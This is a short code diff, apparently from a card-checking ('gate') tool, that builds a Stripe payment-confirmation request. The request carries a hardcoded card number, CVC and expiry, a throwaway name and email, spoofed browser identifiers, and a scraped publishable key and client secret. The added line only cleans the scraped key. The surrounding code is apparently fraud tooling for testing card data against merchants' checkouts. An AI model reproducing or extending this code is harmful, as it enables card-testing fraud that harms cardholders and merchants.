@@ -489,6 +489,7 @@ def stripe_charge_gate():
     except:
         return "", ""
 
+    pk_key = pk_key.replace("'", "")
     payment_intent = pi_key.split("_")[0]
     data = f"payment_method_data[type]=card&payment_method_data[billing_details][name]=rose&payment_method_data[billing_details][email]=roseloverx%40proton.me&payment_method_data[card][number]=5360886344323030&payment_method_data[card][cvc]=394&payment_method_data[card][exp_month]=02&payment_method_data[card][exp_year]=25&payment_method_data[guid]=3a86e6fb-a4ad-45e5-b84d-753c14aeca051abe6d&payment_method_data[muid]=cc79fe27-9b43-442c-a8a0-2d99ed7ac3a676a978&payment_method_data[sid]=891e1a39-908f-417d-8be3-46e557d48ad9c0b4ee&payment_method_data[payment_user_agent]=stripe.js%2Fe5a12ae7c%3B+stripe-js-v3%2Fe5a12ae7c&payment_method_data[time_on_page]=69370&expected_payment_method_type=card&use_stripe_sdk=true&key={pk_key}&client_secret={pi_key}"
 
